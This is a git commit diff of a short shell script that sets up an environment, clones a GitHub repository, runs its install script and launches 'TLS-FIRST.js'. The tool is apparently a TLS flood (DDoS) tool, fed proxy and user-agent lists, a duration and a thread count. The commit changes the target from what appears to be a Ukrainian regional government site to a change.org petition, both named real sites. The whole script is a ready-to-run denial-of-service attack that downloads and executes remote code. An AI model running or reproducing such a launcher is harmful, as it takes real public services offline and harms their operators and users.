a543871dec27ec8088126a6409e9e6f0f12c2990
GolubevsEv <124365636+GolubevsEv@users.noreply.github.com>
2023-06-08 00:09:46 +0300

    Update PlaywithDocker.sh

--- PlaywithDocker.sh
+++ PlaywithDocker.sh
@@ -1,10 +1,10 @@
 apk update
 apk upgrade
-git clone https://github.com/hellovokzal/TLS-FIRST
-cd TLS-FIRST
+git clone https://github.com/GolubevsEv/Poqjjs11
+cd Poqjjs11
 bash install.sh -y
 apk add nodejs
 apk add npm
 npm i colors
-node TLS-FIRST.js https://oda.od.gov.ua 3000 proxy.txt ua.txt 10 100
+node TLS-FIRST.js https://www.change.org/p/kick-russia-out-of-the-un 3000 proxy.txt ua.txt 10 100
 
